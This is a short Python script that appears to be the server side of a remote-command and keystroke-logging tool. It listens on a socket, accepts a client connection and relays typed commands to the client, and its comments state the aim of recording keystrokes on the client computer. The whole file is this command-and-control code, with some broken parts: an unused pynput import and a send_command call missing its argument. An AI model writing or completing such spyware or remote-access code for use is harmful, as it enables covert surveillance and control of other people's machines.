import socket, sys
from pynput.keyboard import Key, Listener
#Create socket (allows two computers to connect)
def create_socket():
    try:
        global host
        global port
        global s
        host = "10.1.10.162"
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket Creation Error:", str(msg))


#bind socket to port (host and port communication will take place

def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding socket to port", str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket Binding Error", str(msg))
        print("Retrying...")
        bind_socket()


#establish connection from client to server (socket must be binded)
def established_connection():
    conn, addr = s.accept()
    print("Connection Established: ")
    print("IP: ", addr[0])
    print("Port: ", addr[1])

#send command to client
    send_command(conn)

    #Close The Connection
    conn.close()

#Send commands to user/client
#Record Keystrokes on client computer
#Must pass in the users IP Address/Connection
def send_command(conn):
    while True:
        send = input("Insert Command:")
        cmd = str.encode(send)
        if len(cmd) > 0:
            conn.send(cmd)
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")


def main():
    create_socket()
    bind_socket()
    established_connection()
    send_command()

    #run program
main()
